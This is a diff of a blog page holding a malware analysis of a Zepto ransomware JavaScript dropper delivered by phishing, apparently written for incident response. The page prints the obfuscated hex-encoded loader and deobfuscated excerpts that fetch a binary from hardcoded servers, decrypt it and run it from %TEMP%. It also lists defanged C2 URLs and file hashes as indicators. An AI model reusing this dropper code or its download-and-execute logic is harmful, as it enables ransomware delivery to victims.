@@ -8,7 +8,8 @@
     content="Adrian">
 <meta name="description"
     content="It&amp;rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
-First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share." />
+First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share.
+Zepto creates a help file in all of the directories it attacks." />
 <meta name="keywords" content="security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis,blog,consulting,cyber" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="/post/a-look-at-zepto-ransomware-payload-delivery-analysis/" />
@@ -39,22 +40,17 @@ First thing&amp;rsquo;s first, I need to find all the users actively encrypting 
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="A Look at Zepto Ransomware - Payload Delivery Analysis">
 <meta itemprop="description" content="It&rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
-First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.">
-
-
-<meta itemprop="datePublished" content="2016-08-16T12:36:51&#43;00:00" />
+First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.
+Zepto creates a help file in all of the directories it attacks."><meta itemprop="datePublished" content="2016-08-16T12:36:51&#43;00:00" />
 <meta itemprop="dateModified" content="2016-08-16T12:36:51&#43;00:00" />
-<meta itemprop="wordCount" content="5257">
-
-
-
-<meta itemprop="keywords" content="Malware,Reverse Engineering,Malware Analysis,Zepto,Ransomware," />
-<meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="wordCount" content="5257"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="Malware,Reverse Engineering,Malware Analysis,Zepto,Ransomware," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/"/>
 
 <meta name="twitter:title" content="A Look at Zepto Ransomware - Payload Delivery Analysis"/>
 <meta name="twitter:description" content="It&rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
-First thing&rsquo;s first, I need to find all the users actively encrypting files on this share."/>
+First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.
+Zepto creates a help file in all of the directories it attacks."/>
 
 
 
@@ -130,25 +126,15 @@ First thing&rsquo;s first, I need to find all the users actively encrypting file
             
 
             <div class="post-content">
-                
-
-<p>It&rsquo;s another quiet Friday when we are alerted of bunch of files with the <code>.zepto</code> extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.</p>
-
+                <p>It&rsquo;s another quiet Friday when we are alerted of bunch of files with the <code>.zepto</code> extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.</p>
 <p>First thing&rsquo;s first, I need to find all the users actively encrypting files on this share.</p>
-
 <p>Zepto creates a help file in all of the directories it attacks. They&rsquo;re usually prefixed with a number, ie: <code>\_45\_HELP_instructions.html</code>.</p>
-
 <p>It&rsquo;s a pretty unique signature and looking at the <code>owner</code> property in the ACL I can find potentially infected users:</p>
-
 <pre><code class="language-powershell">PS C:\&gt; dir \\network\share\*_HELP_instructions.html -recurse | %{ (get-acl $_.fullname).owner | select -unique
 </code></pre>
-
 <p>OK, great. The next step was to grab a sample of this ransomware and figure out what the C2 servers are so we can block them. If it can&rsquo;t get a key from C2, it won&rsquo;t begin encrypting.</p>
-
 <p>We managed to trace the attack vector to a javascript file zipped and attached to a phishing email.</p>
-
 <p>Contents of <code>business card 5a0fae48-.js</code>:</p>
-
 <pre><code class="language-javascript">wsh = WScript[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
 se = wsh[&quot;Environment&quot;](&quot;SYSTEM&quot;);
 os = se(&quot;OS&quot;);
@@ -162,16 +148,11 @@ var aDSu3 = (1, 2, 3, ['\x77\x73\x68\x20\x3d', '\x20\x57\x53\x63\x72', '\x69\x70
 '\x4b\x6a\x29\x5d\x28', '\x29\x3b\x0d\x0a\x7d', '\x3b']);
 eval(aDSu3.join(''));
 </code></pre>
-
 <p>The first couple of lines are self-explanatory. A simple check against the <code>%OS%</code> environment variable to see if it is a known operating system (Windows 2000 -&gt; Windows 10) just before a whole bunch of hex encoded data.</p>
-
 <p>If we replace the <code>eval()</code> at the end with a <code>WScript.Echo()</code> we can see the contents of <code>aDSu3</code> and pipe them into a separate file for analysis:</p>
-
 <pre><code class="language-nix">C:\temp&gt;cscript &quot;business card 5a0fae48-.js&quot; &gt; zepto.js
 </code></pre>
-
 <p>&hellip;and what we get is this mess:</p>
-
 <pre><code class="language-javascript">wsh = WScript[&quot;CreateObject&quot;](&quot;WScript.Shell&quot;);
 se = wsh[&quot;Environment&quot;](&quot;SYSTEM&quot;);
 os = se(&quot;OS&quot;);
@@ -1066,34 +1047,23 @@ function OMb(GLq, Nq) {
     Fm[Mn + Kj0(Kj)]();
 };
 </code></pre>
-
 <p>The best way to walk through this code is using Visual Studio:</p>
-
 <pre><code class="language-c">C:\temp&gt;cscript zepto.js //x
 </code></pre>
-
 <p>VS will set a breakpoint on the first line and wait for your input. The first big chunk of the code is initialization and obfuscation.</p>
-
 <p>All over the place you&rsquo;ll see functions that do this:</p>
-
 <pre><code class="language-javascript">function Rd(Lq1) {  
     return Lq1;
 };
 </code></pre>
-
 <p>They just return whatever value is passed in. Instead of writing</p>
-
 <pre><code class="language-javascript">WScript[&quot;Sleep&quot;](2000);
 </code></pre>
-
 <p>you can obfuscate by replace it with</p>
-
 <pre><code class="language-javascript">var Xyz = &quot;eep&quot;;
 WScript[&quot;Sl&quot; + Rd(Xyz)](-4000 + 6000);
 </code></pre>
-
 <p>A good example of this is the <code>MSXML2.XMLHTTP</code> object creation:</p>
-
 <pre><code class="language-javascript">var Yz = [(function OQa() {
     return Lm6;
 }()) + Rd(YMa2) + QYx4 + Kh, Nn0 + BFi + DQo + ABx + (function Cl1() {
@@ -1109,9 +1079,7 @@ for (var IBx3 = 1 * 0; IBx3 &lt; Yz[Gp + Zx5]; IBx3++) {
     }
 };
 </code></pre>
-
 <p>The <code>Yz</code> var looks confusing but really it&rsquo;s just a bunch of strings and anonymous functions returning strings glued together. If you substitute their values you end up with:</p>
-
 <pre><code class="language-javascript">var Yz = [(function OQa() {
     return &quot;MSXM&quot;;
 }()) + Rd(&quot;L2.XM&quot;) + &quot;LHTT&quot; + &quot;P&quot;, &quot;WinH&quot; + &quot;ttp&quot; + &quot;.Wi&quot; + &quot;nHttp&quot; + (function Cl1() {
@@ -1121,17 +1089,11 @@ for (var IBx3 = 1 * 0; IBx3 &lt; Yz[Gp + Zx5]; IBx3++) {
 // and further simplified:
 var Yz = [&quot;MSXML2.XMLHTTP&quot;, &quot;WinHttp.WinHttpRequest.5.1&quot;];
 </code></pre>
-
 <p>You get the idea.</p>
-
 <p>The for loop following <code>Yz</code> creates an object that will eventually download the next stage in the infection. Nothing special here.</p>
-
 <p>What I&rsquo;m more interested in is the <code>do{}while();</code> loop just below that, so I&rsquo;ll set a breakpoint in VS:</p>
-
-<p><img src="/images/2016/08/bp1.png" alt="" /></p>
-
+<p><img src="/images/2016/08/bp1.png" alt=""></p>
 <p>Stepping through the code I can see <code>Lj4</code> being referenced in a GET request and iterated through with the do-while loop:</p>
-
 <pre><code class="language-javascript">...
         if ((1 * 1) == Lp9) {
             IGv7[Oy1](Np, Lj4[Gr++ % Lj4[Gp + Zx5]], false); // IGv7[&quot;open&quot;](&quot;GET&quot;, &quot;URLn&quot;, false); 
@@ -1145,40 +1107,27 @@ var Yz = [&quot;MSXML2.XMLHTTP&quot;, &quot;WinHttp.WinHttpRequest.5.1&quot;];
         }
 ...
 </code></pre>
-
 <p>Adding the <code>Lj4</code> array to the Watch list, I can view the contents:</p>
-
-<p><img src="/images/2016/08/urls-1.png" alt="" /></p>
-
+<p><img src="/images/2016/08/urls-1.png" alt=""></p>
 <p>Great, I&rsquo;ll add these to the network block list.</p>
-
 <h2 id="payload-decryption">Payload Decryption</h2>
-
 <p>The binary is downloaded and written to disk but it is encrypted. The script will store it in <code>%TEMP%</code> with a random file name and no extension (yet).</p>
-
 <pre><code class="language-javascript">var Vi5 = JEc3.ExpandEnvironmentStrings(Pm0 + LPi2 + KTx); // expand '%TEMP%/'
 var El = Vi5 + Tm1 + (function CJx3() {  
     return FAt8;
 }()) + IZr + ZLu; // 7eJ4XMIHWJarnl
 var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
 </code></pre>
-
 <p>Decryption begins with <code>DAb4</code> set after the download completes inside the do-while above:</p>
-
 <pre><code class="language-javascript">...
         var DAb4 = HIi(El);
         DAb4 = Kx1(DAb4);
 ...
 </code></pre>
-
 <p>Within <code>HIi()</code>, the contents of the encrypted file are read into the <code>DAb4</code> variable using an <code>ADODB.Stream</code> object.</p>
-
 <h2 id="must-go-deeper">Must Go Deeper</h2>
-
 <p>Also inside <code>HIi()</code>, the first substitution function <code>IGi2()</code> is also called with the data read from disk.</p>
-
 <p><code>IGi2()</code> will iterate through every byte and if the char code is 128 or higher, it will replace it with a hardcoded value stored in a local variable <code>ELs[]</code>:</p>
-
 <pre><code class="language-javascript">function IGi2(SPz0) {  
     var ELs = new Array();
 
@@ -1200,18 +1149,12 @@ var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
     return DAb4;
 };
 </code></pre>
-
 <p>You can see the execution state after the first decryption stage:
-<img src="/images/2016/08/decryption1.PNG" alt="" /></p>
-
+<img src="/images/2016/08/decryption1.PNG" alt=""></p>
 <p><code>SPz0</code> is the content of the data on disk. In its current state, it is not a valid PE file (notice the lack of <code>MZ</code> magic bytes). Finally the <code>IGi2()</code> local array <code>DAb4</code> is returned and stored in another array with the same name but in the previous scope.</p>
-
 <p>The next step is to pass the (still) encrypted contents of <code>DAb4</code> to <code>Kx1()</code>, the main decryption routine.</p>
-
 <p>After some XOR and bit shifting, the decrypted payload is returned and stored back into <code>DAb4</code>.</p>
-
 <p>A few checks to see if decryption was successful are performed:</p>
-
 <pre><code class="language-javascript">...
         // the binary expects to be between 100kb and 235kb
         if (DAb4[Gp + Zx5] &lt; 100 * 1024 || DAb4[Gp + Av(Zx5)] &gt; 230 * 1024 || !XHw6(DAb4)) {
@@ -1225,17 +1168,11 @@ var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
         };
 ...
 </code></pre>
-
 <p>You can also see the <code>XHw6()</code> function which checks the first two bytes of the decrypted binary against <code>x4D\x5A</code> commonly known as <code>MZ</code>:</p>
-
-<p><img src="/images/2016/08/check_for_MZ.PNG" alt="" /></p>
-
+<p><img src="/images/2016/08/check_for_MZ.PNG" alt=""></p>
 <p>The next step will call <code>OMb()</code> which in turn will call the final substitution routine <code>St()</code>. It&rsquo;s job is to take another 127 bytes and replace them with hardcoded values stored in the local array <code>HFw3[]</code>:</p>
-
-<p><img src="/images/2016/08/decryption2.PNG" alt="" /></p>
-
+<p><img src="/images/2016/08/decryption2.PNG" alt=""></p>
 <p>The local array <code>Ww</code> now holds the decrypted binary and is ready to be written to disk:</p>
-
 <pre><code class="language-javascript">...
     Fm[BEs + NSy + DGz + (function RFu8() {
         return NTs8;
@@ -1245,9 +1182,7 @@ var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
     Fm[GKj + ANb8 + Ds(GDa1)](GLq, 2);
 ...
 </code></pre>
-
 <p>The final step will execute the binary from the <code>%TEMP%</code> folder with <code>323</code> as the argument:</p>
-
 <pre><code class="language-javascript">...
         // WScript.Shell.Run(&quot;%TEMP%/7eJ4XMIHWJarnl.exe 323&quot;);
         JEc3[DOo2 + Va0](Uw + (function FLv2() {
@@ -1256,9 +1191,7 @@ var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
         break;
 ...
 </code></pre>
-
 <p>The do-while main loop traps exceptions and if anything fails between <em>download</em> and <em>execute</em>, the script will wait 1 second and try the whole process again.</p>
-
 <pre><code class="language-javascript">var Lp9 = 1;
 ...
 do {
@@ -1275,35 +1208,26 @@ do {
     };
 while (Lp9);
 </code></pre>
-
 <h2 id="iocs">IOCs</h2>
-
 <p>Hardcoded stage 1 servers</p>
-
 <pre><code class="language-nix">hxxp://regeneratewert.ws/1qvvu9lu
 hxxp://traveltotre.in/2c4ykij7
 hxxp://escapegasmech.com/048220y5
 hxxp://goldjinoz.com/0a3tg
 </code></pre>
-
 <p>Decrypted binary</p>
-
 <pre><code class="language-nix"># %TEMP%/7eJ4XMIHWJarnl.exe 
 MD5: 7F20DC4906319652A136C89369F77116
 SHA-256: F37B031056389AFD16A7FDD0A94D912100D1967FE0257963E5C6D7BFE0A2C6E3
 SSDeep: 3072:L/NMf5oDPD/pCxpH3JR9P2ev4q3k4N7dH0CzzslzpyZcaZV04:GhQjpwhbJkaAdy
 </code></pre>
-
 <p>Email attachment</p>
-
 <pre><code class="language-nix"># a4b985103f4.zip
 MD5: 26660D2A11B8DB76D28B4AFF5D08E34A
 SHA-256: 38D5E30D0282617D2398B9819B287A21B1DD897AC747656170BBE2D961B85B6E
 SSDeep: 192:yun3pWxM8gIW2HvNACkltcGmf/zDPS1uBpKJ4GG7NCwHeEvKSoehXNWWVq1Vwfk6:yun3pWxM0fHVAg7DPS1AqGhCwhZHZf3v
 </code></pre>
-
 <p>Stage 1 downloader</p>
-
 <pre><code class="language-nix"># business card 5a0fae48-.js
 MD5: 8A9F3577EC370FCBDFF0101B1B5798BE
 SHA-256: FDA2871DECA00EA0E7BB684165503525E06F2BD7D1313A9D5770D765B158A2F8
@@ -1330,7 +1254,7 @@ SSDeep: 384:UGJVn6iUFUZGxx9djhEzJd0rQ8RioPkNKtzkJyjK4N0f2YblYxJib9Z8RMS3rlph:7zZ
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2020</span>
+            <span>&copy; 2021</span>
             
                 <span><a href="/">Bit Therapy</a></span>
             
@@ -1358,7 +1282,7 @@ SSDeep: 384:UGJVn6iUFUZGxx9djhEzJd0rQ8RioPkNKtzkJyjK4N0f2YblYxJib9Z8RMS3rlph:7zZ
 
 
 
-<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
 
 
 
